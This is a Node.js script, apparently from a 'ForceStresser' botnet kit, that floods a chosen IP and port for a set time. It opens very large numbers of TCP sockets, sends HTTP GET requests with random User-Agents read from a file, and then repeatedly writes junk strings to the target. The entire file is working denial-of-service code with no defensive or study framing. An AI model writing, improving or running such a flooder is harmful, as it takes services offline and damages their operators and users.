const net = require("net");
const fs = require("fs");

if (process.argv.length < 5) {
    console.log("Usage: node tcp-ack.js <IP_TARGET> <PORT_TARGET> <TIME>");
    process.exit(1);
}

const targetIp = process.argv[2];
const targetPort = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]) * 1000;
const startTime = Date.now();

const threads = 10000; 
const connectionsPerThread = 1000000;
const interval = -1; 

let userAgents = [];
if (fs.existsSync("ua.txt")) {
    userAgents = fs.readFileSync("ua.txt", "utf8")
        .split("\n")
        .map(ua => ua.trim())
        .filter(ua => ua.length > 0);
}

if (userAgents.length === 0) {
    console.log("❌ Gagal memuat daftar User-Agent.");
    process.exit(1);
}

console.log(`🔥 Starting Ticipi Flud`);
console.log(`🚀 Target: ${targetIp}:${targetPort} | Duration: ${process.argv[4]}s | Threads: ${threads}`);
console.log(`📂 Loaded ${userAgents.length} User-Agents from ua.txt`);

function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
}

function attack() {
    let connections = [];

    function createSocket() {
        if (Date.now() - startTime > duration) {
            connections.forEach(socket => socket.destroy());
            console.log(`⏹️ Attack stopped.`);
            process.exit(0);
        }

        const socket = new net.Socket();
        const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
        const request = `GET / HTTP/1.1\r\nHost: ${targetIp}\r\nUser-Agent: ${randomUA}\r\n\r\n`;

        socket.connect(targetPort, targetIp, () => {
            socket.write(request);
        });

        socket.on("error", () => {
            socket.destroy();
            process.nextTick(createSocket); 
        });

        connections.push(socket);
    }

    for (let i = 0; i < connectionsPerThread; i++) {
        createSocket();
    }

    setInterval(() => {
        shuffle(connections);
        connections.forEach(socket => {
            if (!socket.destroyed) {
                socket.write("管理员迪克, 管理员迪克 Hello Sir, ForceStresser C2 Botnet In Here!!!管理员迪克, 管理员迪克"); 
            }
        });
    }, interval);
}

for (let i = 0; i < threads; i++) {
    attack();
}